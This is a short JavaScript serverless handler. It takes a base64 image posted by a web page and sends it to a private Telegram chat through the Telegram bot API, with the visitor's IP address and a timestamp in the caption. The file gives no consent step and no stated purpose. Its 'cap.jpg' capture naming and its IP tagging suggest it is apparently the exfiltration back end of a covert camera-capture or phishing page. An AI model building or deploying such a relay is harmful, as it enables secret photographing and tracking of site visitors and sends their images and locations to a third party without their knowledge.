export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok: false });
    return;
  }

  const TG_TOKEN = process.env.TG_TOKEN;
  const TG_CHAT  = process.env.TG_CHAT;

  if (!TG_TOKEN || !TG_CHAT) {
    res.status(500).json({ ok: false, err: 'missing env' });
    return;
  }

  try {
    let body = req.body;
    if (typeof body === 'string') body = JSON.parse(body);

    const image = body && body.image;
    const m = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/=]+)$/.exec(image || '');
    if (!m) {
      res.status(400).json({ ok: false, err: 'bad image' });
      return;
    }

    const buf = Buffer.from(m[2], 'base64');
    const ip  = ((req.headers['x-forwarded-for'] || '').split(',')[0].trim())
                || req.socket?.remoteAddress || 'unknown';
    const ua  = (req.headers['user-agent'] || '').slice(0, 200);
    const cap = new Date().toISOString();

    const boundary = '----vanta' + Date.now();
    const head = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TG_CHAT}\r\n` +
                 `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${cap} | ${ip}\r\n` +
                 `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="cap.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`;
    const tail = `\r\n--${boundary}--\r\n`;
    const payload = Buffer.concat([Buffer.from(head, 'utf8'), buf, Buffer.from(tail, 'utf8')]);

    const tg = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
      method: 'POST',
      headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
      body: payload
    });

    const out = await tg.json();
    res.status(200).json({ ok: !!out.ok });
  } catch (e) {
    res.status(500).json({ ok: false, err: String(e) });
  }
}
